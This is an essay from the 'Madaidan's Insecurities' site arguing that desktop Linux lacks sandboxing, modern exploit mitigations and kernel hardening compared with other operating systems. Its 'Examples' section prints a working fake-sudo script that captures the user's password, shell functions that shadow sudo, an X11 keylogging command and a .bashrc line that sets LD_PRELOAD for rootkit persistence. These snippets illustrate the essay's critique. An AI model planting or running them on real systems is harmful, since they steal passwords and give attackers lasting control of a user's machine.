 Linux | Madaidan's Insecurities 🌓

Linux
=====

_Last edited: March 18th, 2022_

Linux being secure is a common misconception in the security and privacy realm. Linux is thought to be secure primarily because of its source model, popular usage in servers, small userbase and confusion about its security features. This article is intended to debunk these misunderstandings by demonstrating the lack of various, important security mechanisms found in other desktop operating systems and identifying critical security problems within Linux's security model, across both user space and the kernel. Overall, other operating systems have a much stronger focus on security and have made many innovations in defensive security technologies, whereas Linux has fallen far behind.  
  
Section 1 explains the lack of a proper application security model and demonstrates why some software that is commonly touted as solutions to this problem are insufficient. Section 2 examines and compares a number of important exploit mitigations. Section 3 presents a plethora of architectural security issues within the Linux kernel itself. Section 4 shows the ease at which an adversary can acquire root privileges, and section 5 contains examples thereof. Section 6 details issues specific to "stable" release models, wherein software updates are frozen. Section 7 discusses the infeasibility of the average user correcting the aforementioned issues. Finally, section 8 provides links to what other security researchers have said about this topic.  
  
Due to inevitable pedanticism, "Linux" in this article refers to a standard desktop Linux or GNU/Linux distribution.

Contents
--------

[1\. Sandboxing](#sandboxing) [1.1 Flatpak](#flatpak)  
[1.2 Firejail](#firejail)  
[2\. Exploit Mitigations](#exploit-mitigations) [2.1 Arbitrary Code Guard and Code Integrity Guard](#acg-cig)  
[2.2 Control Flow Integrity](#cfi)  
[2.3 Automatic Variable Initialisation](#auto-var-init)  
[2.4 Virtualization-based Security](#vbs)  
[3\. Kernel](#kernel)  
[4\. The Nonexistent Boundary of Root](#root)  
[5\. Examples](#examples)  
[6\. Distribution-specific Issues](#distro-specific-issues) [6.1 Stable Release Models](#stable-release-models)  
[7\. Manual Hardening](#hardening)  
[8\. Other Security Researchers' Views on Linux](#security-researcher-views)  

[1\. Sandboxing](#sandboxing)
-----------------------------

The [traditional application security model](https://theinvisiblethings.blogspot.com/2010/08/ms-dos-security-model.html) on desktop operating systems gives any executed application complete access to all data within the same user account. This means that any malicious application you install or an exploited vulnerability in an otherwise benevolent application can result in the attacker immediately gaining access to your data. Such vulnerabilities are inevitable, and their impact should be limited by strictly isolating software from one another.  
  
Linux still follows this security model, and as such, there is no resemblance of a strong sandboxing architecture or permission model in the standard Linux desktop — current sandboxing solutions are either nonexistent or insufficient. All applications have access to each other’s data and can snoop on your personal information.  
  
In comparison, other desktop operating systems, including Windows 10, macOS and ChromeOS have put considerable effort into sandboxing applications, the last two in particular:

* Windows still falls behind when it comes to sandboxing, but it has at least made some progress — [Windows automatically sandboxes UWP applications](https://docs.microsoft.com/en-us/windows/uwp/security/intro-to-secure-windows-app-development#41-windows-app-model) and provides the [Windows Sandbox utility](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-sandbox/windows-sandbox-overview) for non-UWP applications.  
    
* In macOS, [all applications require user consent before accessing sensitive data](https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=119), and [all applications in the App Store are further sandboxed](https://developer.apple.com/documentation/security/app_sandbox).
* [All applications in ChromeOS are sandboxed regardless](https://chromium.googlesource.com/chromiumos/docs/+/HEAD/sandboxing.md).

### [1.1 Flatpak](#flatpak)

[Flatpak](https://www.flatpak.org/) aims to sandbox applications, but [its sandboxing is very flawed](https://flatkill.org/). It fully trusts the applications and allows them to specify their own policy. This means that security is effectively optional and applications can simply choose not to be sufficiently sandboxed.  
  
Flatpak's permissions are also far too broad to be meaningful. For example, many applications come with the `filesystem=home` or `filesystem=host` permissions, which grant read-write access to the user's home directory, giving access to all of your personal files and allowing trivial sandbox escapes via writing to `~/.bashrc` or similar.  
  
In the [Flathub Github organisation](https://github.com/flathub), ~550 applications [come](https://github.com/search?q=org%3Aflathub+filesystem%3Dhome&type=code) [with](https://github.com/search?q=org%3Aflathub+filesystem%3Dhost&type=code) such permissions, which is ~30% of all repositories. While this percentage may not seem significant, it includes a considerable amount of applications that people will commonly use. Examples of such include [GIMP](https://github.com/flathub/org.gimp.GIMP/blob/f819d5614ca19d3ffff99f2040881a873daa175f/org.gimp.GIMP.json#L14), [Eog](https://github.com/flathub/org.gnome.eog/blob/4d87a2a397d0f98ea8f4b72e695163570dd0f53f/org.gnome.eog.yml#L14), [Gedit](https://github.com/flathub/org.gnome.gedit/blob/ffb84266826d76d39a7643f302fe371c064c040e/org.gnome.gedit.yml#L15), [VLC](https://github.com/flathub/org.videolan.VLC/blob/a32f0f11408596d1248ad415ce852de2e4c931eb/org.videolan.VLC.json#L13), [Krita](https://github.com/flathub/org.kde.krita/blob/dea979140f5f75611b3b76a9da145a97a733aa86/org.kde.krita.json#L15), [LibreOffice](https://github.com/flathub/org.libreoffice.LibreOffice/blob/6d9d7f43d5a0562a1269cd0df078b2bdb4a3144b/org.libreoffice.LibreOffice.json#L631), [Audacity](https://github.com/flathub/org.audacityteam.Audacity/blob/cd4d8ef8ce3f01800b45434bc401569155efe7d4/org.audacityteam.Audacity.yaml#L18), [VSCode](https://github.com/flathub/com.visualstudio.code/blob/ad626a6630ef05d5aebcc4b1a57cbc32fc7a1585/com.visualstudio.code.yaml#L18), [Dropbox](https://github.com/flathub/com.dropbox.Client/blob/a97e98e2f8386d59cf04b9e3ccb0c575ba9f6954/com.dropbox.Client.json#L15), [Transmission](https://github.com/flathub/com.transmissionbt.Transmission/blob/fc3a0335e6d9d8f98d9a0621c0f57c033f5b226a/com.transmissionbt.Transmission.json#L19), [Skype](https://github.com/flathub/com.skype.Client/blob/cd0b69e49535337be131b06be56e5e5640692f00/com.skype.Client.json#L20) and countless others.  
  
Another example of Flatpak's broad permissions is how it allows unfiltered access to the X11 socket, permitting easy sandbox escapes due to [X11's lack of GUI isolation](https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html). Adding X11 sandboxing via a nested X11 server, such as Xpra, would not be difficult, but [Flatpak developers refuse to acknowledge this and continue to claim, "X11 is impossible to secure"](https://blogs.gnome.org/alexl/2015/02/17/first-fully-sandboxed-linux-desktop-app/).  
  
Further examples include [Flatpak giving complete access to directories such as `/sys` or `/proc`](https://github.com/flatpak/flatpak/blob/686af7d3b81b1315256e79eb5991cede458f3498/common/flatpak-run.c#L3171-L3194) (kernel interfaces known for information leaks), rather than allowing fine-grained access to only the required files, and the highly permissive seccomp filter which [only blacklists ~20 syscalls](https://github.com/flatpak/flatpak/blob/f687f6b2ebfe9bc69f59e42bb96475ca01f08548/common/flatpak-run.c#L2646-L2693) and still exposes significant kernel attack surface.

### [1.2 Firejail](#firejail)

[Firejail](https://firejail.wordpress.com/) is another common sandboxing technology; however, it is also insufficient. Firejail worsens security by acting as a privilege escalation hole — Firejail requires being [setuid](https://en.wikipedia.org/wiki/Setuid), meaning that it executes with the privileges of the executable's owner, which in this case, is the root user. This means that a vulnerability in Firejail can allow escalating to root privileges.  
  
As such, great caution should be taken with setuid programs, but Firejail instead focuses more on usability and unessential features, which adds significant attack surface and complexity to the code, resulting in [numerous privilege escalation and sandbox escape vulnerabilities](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=firejail), [many of which aren't particularly complicated](https://seclists.org/oss-sec/2017/q1/25).  
  
For comparison, another Linux sandboxing tool — [bubblewrap](https://github.com/containers/bubblewrap) — has significantly less attack surface and is less prone to exploitation because it aims to be very minimal and provide only the absolutely necessary functionality. This is very important and makes the potential for vulnerabilities extremely low.  
  
As an example of this, [bubblewrap doesn't even generate seccomp filters itself](https://github.com/containers/bubblewrap/issues/317). One must create their own, often via [seccomp\_export\_bpf](https://www.man7.org/linux/man-pages/man3/seccomp_export_bpf.3.html), and supply it to bubblewrap. Another example is bubblewrap's simplistic command line arguments: there is no parsing of configuration files or complex / redundant parameters. The user specifies exactly what they want in the sandbox and that's it, whereas Firejail supports hundreds of convoluted [command line arguments](https://firejail.wordpress.com/features-3/man-firejail/) and [profile rules](https://firejail.wordpress.com/features-3/man-firejail-profile/), many of which boil down to overcomplicated blacklist rules.  
  
Unfortunately, bubblewrap isn't very widespread and can be difficult to learn. Bubblewrap is essentially a bare bones wrappers around namespaces and seccomp. A user would need decent knowledge on how the filesystem, syscalls and so on work to properly use it.

[2\. Exploit Mitigations](#exploit-mitigations)
-----------------------------------------------

Exploit mitigations eliminate entire classes of common vulnerabilities / exploit techniques to prevent or severely hinder exploitation. Linux has not made significant progress on implementing modern exploit mitigations, unlike other operating systems.  
  
Most programs on Linux are written in memory unsafe languages, such as C or C++, which causes [the majority of discovered security vulnerabilities](https://msrc-blog.microsoft.com/2019/07/16/a-proactive-approach-to-more-secure-code/). Other operating systems have made more progress on adopting memory safe languages, such as Windows, which is [leaning heavily towards Rust, a memory safe language](https://msrc-blog.microsoft.com/2019/07/22/why-rust-for-safe-systems-programming/), or macOS which is adopting [Swift](https://swift.org/). While Windows and macOS are still mostly written in memory unsafe languages, they are at least making some progress on switching to safe alternatives.  
  
[The Linux kernel simply implementing support for Rust](https://github.com/Rust-for-Linux) does not imply that it will be actively used. No major portions of the kernel are written in Rust, and there is no intention to do so. Only a handful of drivers are going to be written in Rust, which will actually result in a net _loss_ of security, as [mixed binaries can allow for bypasses of various exploit mitigations](firefox-chromium.html#miscellaneous). Microsoft is the only vendor to have solved the aforementioned problem [by implementing Control Flow Guard support for Rust](https://msrc-blog.microsoft.com/2020/08/17/control-flow-guard-for-clang-llvm-and-rust/).  
  
Furthermore, modern exploit mitigations, such as Control Flow Integrity (CFI), are also not widely used on Linux. A few examples are explained below; however, it does not attempt to be an exhaustive list.

### [2.1 Arbitrary Code Guard and Code Integrity Guard](#acg-cig)

A very common exploit technique is that during exploitation of a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) vulnerability, an attacker injects their own malicious code (known as [shellcode](https://en.wikipedia.org/wiki/Shellcode)) into a part of memory and causes the program to execute it by overwriting critical data, such as [return addresses](https://en.wikipedia.org/wiki/Return_statement) and [function pointers](https://en.wikipedia.org/wiki/Function_pointer), to hijack the control flow and point to the aforementioned shellcode, thereby gaining control over the program.  
  
The industry eventually evolved to mitigate this style of attacks by [marking writable areas of memory as non-executable](https://en.wikipedia.org/wiki/Executable_space_protection) and executable areas as non-writable, preventing an attacker from injecting and executing their shellcode. However, an attacker can bypass this by reusing bits of code already present within the program (known as gadgets) outside of the order in which they were originally intended to be used. An attacker can form a chain of such gadgets to achieve near-arbitrary code execution despite the aforementioned protections, utilising techniques, such as [Return-Oriented Programming](https://en.wikipedia.org/wiki/Return-oriented_programming) (ROP) or [Jump-Oriented Programming](https://www.csc2.ncsu.edu/faculty/xjiang4/pubs/ASIACCS11.pdf) (JOP).  
  
Attackers often inject their shellcode into writable memory pages and then use these code reuse techniques to transition memory pages to executable (using syscalls such as `mprotect` or `VirtualAlloc`), consequently allowing it to be executed. Linux has yet to provide strong mitigations against this avenue of attacks. SELinux does provide the `execmem` boolean; however, this is rarely ever used. There is also the [S.A.R.A. LSM](https://lore.kernel.org/lkml/1562410493-8661-1-git-send-email-s.mesoraca16@gmail.com/), but this has not yet been accepted upstream. In comparison to other operating systems:

* [In 2017, Windows 10 implemented a mitigation](https://blogs.windows.com/msedgedev/2017/02/23/mitigating-arbitrary-native-code-execution/) known as [Arbitrary Code Guard](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference?view=o365-worldwide#arbitrary-code-guard) (ACG), which mitigates the aforementioned exploit technique by ensuring that all executable memory pages are immutable and can never be made writable. Another mitigation known as [Code Integrity Guard](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/exploit-protection-reference?view=o365-worldwide#code-integrity-guard) (CIG) is similar to ACG, but it applies to the filesystem instead of memory, ensuring that an attacker cannot execute a malicious program or library on disk by guaranteeing that all binaries loaded into a process must be signed. Together, ACG and CIG enforce a strict [W^X](https://en.wikipedia.org/wiki/W%5EX) policy in both memory and the filesystem.
* Similar to ACG, macOS includes [Hardened Runtime](https://developer.apple.com/documentation/security/hardened_runtime) to mitigate injecting shellcode into the memory of user space applications. M1 Macs also have [Kernel Integrity Protection](https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=56) (KIP) to protect the kernel. More specifically, it uses a custom hardware mitigation known as [KTRR](https://siguza.github.io/KTRR/) to enforce strict W^X permissions in the kernel.

### [2.2 Control Flow Integrity](#cfi)

As briefly mentioned before, code reuse attacks can be used to achieve near-arbitrary code execution by chaining together snippets of code that already exist in the program. ACG and CIG only mitigate one potential attack vector — creating a ROP/JOP chain to transition mappings to executable. However, an attacker can still use a pure ROP/JOP chain, relying wholly on the pre-existing gadgets without needing to introduce their own code. This can be mitigated with [Control Flow Integrity](https://blog.trailofbits.com/2016/10/17/lets-talk-about-cfi-clang-edition/) (CFI), which severely restricts the gadgets an attacker is able to make use of, thus disrupting their chain.  
  
CFI usually has 2 parts: forward-edge protection (covering JOP, COP, etc.) and backward-edge protection (covering ROP). CFI implementations can vary significantly. Some CFI implementations only cover either forward-edges or backward-edges. Some are coarse-grained (the attacker has more freeway to execute a larger amount of gadgets) rather than fine-grained. Some are probabilistic (they rely on a secret being held and the security properties are not guaranteed) rather than deterministic.  
  
The Linux kernel has [only implemented support for Clang's forward-edge CFI on ARM64](https://www.phoronix.com/scan.php?page=news_item&px=Clang-CFI-Linux-5.13), and in user space, any CFI is practically nonexistent outside of Chromium. In comparison, Windows has had its own coarse-grained, forward-edge CFI implementation since 2014, known as [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) (CFG), which is used in the kernel and across user space. Windows also makes use of [Intel CET shadow stacks for backward-edge protection](https://techcommunity.microsoft.com/t5/windows-kernel-internals/understanding-hardware-enforced-stack-protection/ba-p/1247815), and while CFG is only coarse-grained, [Microsoft are working on making it more fine-grained with XFG](https://connormcgarr.github.io/examining-xfg/). [M1 Macs also use Pointer Authentication Codes](https://manuals.info.apple.com/MANUALS/1000/MA1902/en_US/apple-platform-security-guide.pdf#page=56) (PAC) to ensure forward and backward-edge protection.

### [2.3 Automatic Variable Initialisation](#auto-var-init)

One of the most common classes of memory corruption vulnerabilities is [uninitialised memory](https://en.wikipedia.org/wiki/Uninitialized_variable). [Windows uses InitAll](https://msrc-blog.microsoft.com/2020/05/13/solving-uninitialized-stack-memory-on-windows/) to automatically initialise stack variables to zero for the kernel and some user space code, as well as [safer APIs for the kernel pool](https://msrc-blog.microsoft.com/2020/07/02/solving-uninitialized-kernel-pool-memory-on-windows/). Whereas on Linux, there are mitigations specifically for kernel stack and heap memory, but this does not cover any user space code, and most mainstream distributions don't actually enable them.

### [2.4 Virtualization-based Security](#vbs)

Windows supports [Virtualization-based Security](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) (VBS), which allows it to run the entire operating system inside of a virtual machine and is used to enforce a number of security guarantees. Examples of such include:

* [Hypervisor-Enforced Code Integrity](https://techcommunity.microsoft.com/t5/windows-insider-program/virtualization-based-security-vbs-and-hypervisor-enforced-code/m-p/240571) (HVCI) makes it significantly harder to inject malicious code into the kernel by using the hypervisor to strengthen code integrity guarantees and ensuring that all code must be validly signed. Even if an attacker [has arbitrary write capabilities and can corrupt page table entries](https://connormcgarr.github.io/pte-overwrites/) (PTEs) to manipulate page permissions, they will still be unable to execute their shellcode because the hypervisor that runs at a higher privilege level won't permit it. This can be thought of as similar to [ACG](linux.html#acg-cig) but much stronger and for the kernel.
* [Kernel Data Protection](https://www.microsoft.com/security/blog/2020/07/08/introducing-kernel-data-protection-a-new-platform-security-technology-for-preventing-data-corruption/) (KDP) prevents tampering with kernel data structures by using the hypervisor to mark them as read-only, thereby making [data-only attacks](https://www.blackhat.com/docs/asia-17/materials/asia-17-Sun-The-Power-Of-Data-Oriented-Attacks-Bypassing-Memory-Mitigation-Using-Data-Only-Exploitation-Technique.pdf) more difficult.
* [PatchGuard](https://en.wikipedia.org/wiki/Kernel_Patch_Protection) is a feature that verifies the integrity of the Windows kernel at runtime by [periodically checking for corruption of important kernel data structures](https://blog.tetrane.com/downloads/Tetrane_PatchGuard_Analysis_RS4_v1.01.pdf). Although because PatchGuard runs at the same privilege level as a kernel exploit, an attacker could simply find a way to patch it out — historically, the only obstable to this has been heavy code obfuscation techniques that can make it hard to disable. However, with VBS, Microsoft have reinforced this protection with [HyperGuard](https://windows-internals.com/hyperguard-secure-kernel-patch-guard-part-1-skpg-initialization/), which leverages the hypervisor to implement it a higher privilege level, thereby making it immune to PatchGuard's weaknesses and substantially more difficult to bypass.

On Linux, there is currently no equivalent to VBS.

[3\. Kernel](#kernel)
---------------------

The Linux kernel itself is also extremely lacking in security. It is a monolithic kernel, which means that it contains a colossal amount of code all within the most privileged part of the operating system and has no isolation between internal components whatsoever. The kernel has huge attack surface and is constantly adding new and dangerous features. It encompasses hundreds of subsystems, tens of thousands of configuration options and millions of lines of code. The Linux kernel's size grows exponentially across each release, and it can be thought of as equivalent to running all user space code as root in PID 1, if not even more dangerous.  
  
One example of such dangerous features is [eBPF](https://lwn.net/Articles/740157/). In a nutshell, eBPF is a very powerful framework within the Linux kernel that allows _unprivileged_ user space to execute arbitrary code within the kernel in order to dynamically extend kernel functionality. eBPF also includes a JIT compiler, which is fundamentally a W^X violation and opens up the possibility of JIT spraying. [The kernel does perform a number of checks on the code that is executed](https://github.com/torvalds/linux/blob/master/kernel/bpf/verifier.c), but [these are routinely bypassed](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story), and [this](https://seclists.org/oss-sec/2021/q2/171) [feature](https://www.openwall.com/lists/oss-security/2021/04/08/1) [has](https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html) [still](https://twitter.com/spendergrsec/status/1244703091037024257) [caused](https://twitter.com/bleidl/status/943714277403357185) [numerous](https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/) [security](https://www.thezdi.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification) [vulnerabilities](https://haxx.in/files/blasty-vs-ebpf.c).  
  
Another example of these features is [user namespaces](https://www.man7.org/linux/man-pages/man7/user_namespaces.7.html). User namespaces allow unprivileged users to interact with lots of kernel code that is normally reserved for the root user. It adds a massive amount of networking, mount, etc. functionality as new attack surface. It has also been the cause of [numerous](https://lists.archlinux.org/pipermail/arch-general/2017-February/043066.html) [privilege](https://lists.archlinux.org/pipermail/arch-general/2017-February/043078.html) [escalation](https://github.com/a13xp0p0v/kconfig-hardened-check#questions-and-answers) [vulnerabilities](https://github.com/subgraph/oz/issues/11#issuecomment-163396758), which is why many distributions, [such as Debian](https://salsa.debian.org/kernel-team/linux/-/blob/master/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch), had started to restrict access to this functionality by default, although most distributions eventually dropped these patches in favour of usability. The endless stream of vulnerabilities arising from this feature shows no sign of stopping either, [even after years since its introduction](https://www.openwall.com/lists/oss-security/2022/01/29/1).  
  
The kernel is written entirely in a memory unsafe language and has hundreds of bugs, many being security vulnerabilities, [discovered each _month_](https://events19.linuxfoundation.org/wp-content/uploads/2017/11/Syzbot-and-the-Tale-of-Thousand-Kernel-Bugs-Dmitry-Vyukov-Google.pdf). In fact, there are so many bugs being found in the kernel, developers can’t keep up, which results in many of the bugs [staying unfixed for a long time](https://syzkaller.appspot.com/upstream). [The kernel is decades behind in exploit mitigations](https://jon.oberheide.org/files/syscan12-exploitinglinux.pdf), and many kernel developers simply [do not care enough](https://www.washingtonpost.com/sf/business/2015/11/05/net-of-insecurity-the-kernel-of-the-argument/).  
  
Other kernels, such as the Windows and macOS kernels, are somewhat similar too, in that they are also large and bloated monolithic kernels with huge attack surface, but they at least realise that these issues exist and take further steps to mitigate them. As an example of this, Windows has historically been plagued by vulnerabilities within its font parsing code, so in response, [Microsoft moved all font parsing out of the kernel and into a separate, heavily sandboxed user space process, restricted via AppContainer](https://www.microsoft.com/security/blog/2017/01/13/hardening-windows-10-with-zero-day-exploit-mitigations/). Windows also implemented a mitigation to [block untrusted fonts from specific processes to reduce attack surface](https://docs.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/feature-to-block-untrusted-fonts). Similarly, [macOS moved a substantial portion of its networking stack — the transport layer — from the kernel into user space](https://devstreaming-cdn.apple.com/videos/wwdc/2017/707h2gkb95cx1l/707/707_advances_in_networking_part_1.pdf), thereby significantly reducing remote kernel attack surface and the impact of vulnerabilities in the networking stack. Linux, however, does not focus on such systemic approaches to security.

[4\. The Nonexistent Boundary of Root](#root)
---------------------------------------------

On ordinary Linux desktops, [a compromised non-root user account with access to sudo is equal to full root compromise](https://www.whonix.org/wiki/Dev/Strong_Linux_User_Account_Isolation), as there are an abundance of ways for an attacker to retrieve the sudo password. Usually, the standard user is part of the "sudo" or "wheel" group, which makes a sudo password security theatre. For example, the attacker can exploit the plethora of keylogging opportunities, such as [Xorg’s lack of GUI isolation](https://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html), [the](https://www.usenix.org/legacy/event/sec09/tech/full_papers/zhang.pdf) [many](https://www.openwall.com/lists/oss-security/2011/11/05/3) [infoleaks](https://staff.ie.cuhk.edu.hk/~khzhang/my-papers/2016-oakland-interrupt.pdf) [in the](https://www.repository.cam.ac.uk/handle/1810/254306) [procfs](https://www.cs.ucr.edu/~zhiyunq/pub/sec14_android_activity_inference.pdf) [filesystem](https://www.gruss.cc/files/procharvester.pdf), [using `LD_PRELOAD` to hook into processes](https://github.com/Aishou/wayland-keylogger) and so much more. Even if one were to mitigate every single way to log keystrokes, [the attacker can simply setup their own fake sudo prompt](https://twitter.com/spendergrsec/status/1355681146273722372) by manipulating `$PATH` or shell aliases/functions to intercept the user's password, completely unbeknownst to the user.  
  
While similar attacks are still possible on other operating systems due to the inherent issues in escalating privileges from an untrusted account, they are often much harder to pull off than on Linux. For example, Windows' [User Account Control](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview) (UAC) provides the [secure desktop functionality](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation), which can make spoofing it significantly harder, provided one is using a standard user account. Moreover, Windows better prevents keylogging by [isolating processes that run at lower integrity levels from those that run at higher integrity levels](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)#user-interface-privilege-isolation-uipi-and-integrity), therefore mitigating Xorg-style attacks. Windows also [restricts DLL preloading](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security) by [disabling the AppInit_DLLs functionality when secure boot is enabled](https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls) and providing a way to [restrict DLL search paths](https://docs.microsoft.com/en-gb/windows/win32/api/libloaderapi/nf-libloaderapi-setdefaultdlldirectories), therefore also mitigating many `LD_PRELOAD`-style attacks. Similarly, macOS includes the [secure event input](https://developer.apple.com/library/archive/technotes/tn2150/_index.html) feature, which thwarts many keylogging attempts and secures keyboard input. In addition, macOS' [System Integrity Protection](https://support.apple.com/en-us/HT204899) and [Hardened Runtime](https://developer.apple.com/documentation/security/hardened_runtime) features can also prevent `LD_PRELOAD`-style attacks.

[5\. Examples](#examples)
-------------------------

The example below sets up a fake sudo prompt to intercept the sudo password:

    cat <<\EOF > /tmp/sudo
    #!/bin/bash
    if [[ "${@}" = "" ]]; then
      /usr/bin/sudo
    else
      read -s -r -p "[sudo] password for ${USER}: " password
      echo "${password}" > /tmp/password
      echo "${password}" | /usr/bin/sudo -S ${@}
    fi
    EOF
    chmod +x /tmp/sudo
    export PATH="/tmp:${PATH}"

Executing the full path to the sudo executable will not help either, as an attacker can fake that with a shell function:

    function /bin/sudo { ... }
    function /usr/bin/sudo { ... }

Alternatively, an attacker could log keystrokes via X11:

    xinput list # Finds your keyboard ID.
    xinput test id # Replace "id" with the ID from the above command.

Now the attacker can simply use `modprobe` to escalate into kernel mode.  
  
An attacker could also trivially setup a persistent, session-wide rootkit via `LD_PRELOAD` or similar variables:

    echo "export LD_PRELOAD=\"/path/to/malicious_library\"" >> ~/.bashrc

This technique is quite common and is used in the majority of user space rootkits. A few examples are [azazel](https://github.com/chokepoint/azazel), [Jynx2](https://github.com/chokepoint/Jynx2) and [HiddenWasp](https://www.intezer.com/blog/linux/hiddenwasp-malware-targeting-linux-systems/).  
  
Those listed above are merely a few examples and do not even require exploiting bugs.

[6\. Distribution-specific Issues](#distro-specific-issues)
-----------------------------------------------------------

### [6.1 Stable Release Models](#stable-release-models)

A myriad of common Linux distributions, including Debian, Ubuntu, RHEL/CentOS, among numerous others use what's known as a "stable" software release model. This involves freezing packages for a very long time and only ever backporting security fixes that have received a [CVE](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures). However, this approach misses the vast majority of security fixes. [Most security fixes do not receive CVEs](https://arxiv.org/abs/2105.14565) because either the developer simply doesn’t care or because it’s not obvious whether or not a bug is exploitable at first.  
  
Distribution maintainers cannot analyse every single commit perfectly and backport every security fix, so they have to rely on CVEs, which people do not use properly. For example, the Linux kernel [is](https://github.com/gregkh/presentation-cve-is-dead/blob/master/cve-linux-kernel.pdf) [particularly](https://grsecurity.net/reports_of_cves_death_greatly_exaggerated) [bad](https://blog.frizn.fr/linux-kernel/cve-2020-14381) [at this](https://seclists.org/oss-sec/2019/q2/165). Even when there is a CVE assigned to an issue, sometimes fixes still aren't backported, such as in the Debian Chromium package, which is [still affected by many severe and public vulnerabilities, some of which are even being exploited in the wild](https://forums.whonix.org/t/chromium-browser-for-kicksecure-discussions-not-whonix/10388/49).  
  
This is in contrast to a rolling release model, in which users can update as soon as the software is released, thereby acquiring all security fixes up to that point.

[7\. Manual Hardening](#hardening)
----------------------------------

It's a common assumption that the issues within the security model of desktop Linux are only "by default" and can be tweaked how the user wishes; however, standard system hardening techniques are not enough to fix any of these massive, architectural security issues. Restricting a few minor things is not going to fix this. Likewise, a few common security features distributions deploy by default are also not going to fix this. Just because your distribution enables a MAC framework without creating a strict policy and still running most processes unconfined, does not mean you can escape from these issues.  
  
The hardening required for a reasonably secure Linux distribution is far greater than people assume. You would need to completely redesign how the operating system functions and implement full system MAC policies, full verified boot (not just for the kernel but the entire base system), a strong sandboxing architecture, a hardened kernel, widespread use of modern exploit mitigations and plenty more. Even then, your efforts will still be limited by the incompatibility with the rest of the desktop Linux ecosystem and the general disregard that most have for security.

[8\. Other Security Researchers' Views on Linux](#security-researcher-views)
----------------------------------------------------------------------------

Many security experts also share these views about Linux, and a few examples are listed below:

* Brad Spengler, developer of grsecurity:  
    [10 Years of Linux Security](https://grsecurity.net/10_years_of_linux_security.pdf),  
    [https://grsecurity.net/~spender/interview_notes.txt](https://grsecurity.net/~spender/interview_notes.txt),  
    [https://twitter.com/grsecurity/status/1249850031357788162](https://twitter.com/grsecurity/status/1249850031357788162),  
    [https://twitter.com/spendergrsec/status/1308734202330963970](https://twitter.com/spendergrsec/status/1308734202330963970)
* Kees Cook from Google, Elena Reshetova from Intel, Alexander Popov from Positive Technologies and others:  
    [What is Lacking in Linux Security and What Are, or Should We be Doing about This?](https://www.youtube.com/watch?v=v7_mwg5f2cE)
* Dmitry Vyukov, Google software engineer:  
    [The state of the Linux kernel security](https://github.com/ossf/wg-securing-critical-projects/blob/main/presentations/The_state_of_the_Linux_kernel_security.pdf)
* Daniel Micay, lead developer of GrapheneOS:  
    [https://www.reddit.com/r/GrapheneOS/comments/bddq5u/os\_security\_ios\_vs\_grapheneos\_vs\_stock_android/ekxifpa/](https://www.reddit.com/r/GrapheneOS/comments/bddq5u/os_security_ios_vs_grapheneos_vs_stock_android/ekxifpa/)
* Solar Designer, founder of Openwall:  
    [https://www.openwall.com/lists/oss-security/2020/10/05/5](https://www.openwall.com/lists/oss-security/2020/10/05/5)
* Joanna Rutkowska, founder of QubesOS:  
    [https://twitter.com/rootkovska/status/1136220742662664193](https://twitter.com/rootkovska/status/1136220742662664193)
* Justin Schuh, former Google Chrome security lead:  
    [https://twitter.com/justinschuh/status/1190347400885329920](https://twitter.com/justinschuh/status/1190347400885329920)

[Go back](/index.html)